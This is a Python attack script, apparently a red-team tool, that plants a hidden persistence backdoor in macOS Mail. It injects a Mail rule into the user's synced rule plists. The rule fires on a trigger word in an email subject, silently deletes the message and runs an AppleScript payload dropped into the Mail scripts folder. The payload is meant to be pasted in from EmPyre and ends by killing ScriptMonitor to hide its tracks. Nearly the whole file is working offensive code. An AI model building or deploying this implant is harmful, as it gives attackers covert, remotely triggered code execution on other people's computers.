import os
from random import choice
from string import ascii_uppercase
__author__ = 'Esteban Rodriguez (n00py)'

#Enter a string that you would like the rule to be named
ruleName = "Test"
#Enter the 'trigger' word; This will need to be present in the subject line to execute the payload
trigger = "n00py"

#Paste the applescript here
#NOTE: When copying the applescript from EmPyre make sure you escape the backslashes twice!
payload =  '''
'''
#This makes the applescript kill itself after the python payload is executed
payload += 'kill `ps -ax | grep \\"ScriptMonitor\\" |grep -v \\"grep\\" |  cut -d \\" \\" -f 1`"'

#Gets the users current home directory
home =  os.getenv("HOME")
#Creates random filenames
SyncedRules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
RulesActiveState = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
AppleScript =  ''.join(choice(ascii_uppercase) for i in range(12)) + ".scpt"
#Skeleton for rule plist
plist = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
<dict>
		<key>AllCriteriaMustBeSatisfied</key>
		<string>NO</string>
		<key>AppleScript</key>
		<string>''' + AppleScript + '''</string>
		<key>AutoResponseType</key>
		<integer>0</integer>
		<key>Criteria</key>
		<array>
			<dict>
				<key>CriterionUniqueId</key>
				<string>254DAA18-F3D3-4255-A130-33AA94DC6686</string>
				<key>Expression</key>
				<string>''' + trigger + '''</string>
				<key>Header</key>
				<string>Subject</string>
			</dict>
		</array>
		<key>Deletes</key>
		<string>YES</string>
		<key>HighlightTextUsingColor</key>
		<string>NO</string>
		<key>MarkFlagged</key>
		<string>NO</string>
		<key>MarkRead</key>
		<string>NO</string>
		<key>NotifyUser</key>
		<string>NO</string>
		<key>RuleId</key>
		<string>9C8F5248-7894-46B4-A081-37AAB2500086</string>
		<key>RuleName</key>
		<string>''' + ruleName + '''</string>
		<key>SendNotification</key>
		<string>NO</string>
		<key>ShouldCopyMessage</key>
		<string>NO</string>
		<key>ShouldTransferMessage</key>
		<string>NO</string>
		<key>TimeStamp</key>
		<integer>466421321</integer>
		<key>Version</key>
		<integer>1</integer>
	</dict>
</array>
</plist>'''
#skeleton for activation plist
plist2 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>9C8F5248-7894-46B4-A081-37AAB2500086</key>
	<true/>
</dict>
</plist>
	'''

script = home + "/Library/Application Scripts/com.apple.mail/" + AppleScript

os.system("touch " + SyncedRules)
with open(SyncedRules, 'w+') as f:
    f.write(plist)
    f.close()

os.system("touch " + RulesActiveState)
with open(RulesActiveState, 'w+') as f:
    f.write(plist2)
    f.close()

with open(script, 'w+') as f:
    f.write(payload)
    f.close()

os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist")
os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/V3/MailData/RulesActiveState.plist")
os.system("rm " + SyncedRules)
os.system("rm " + RulesActiveState)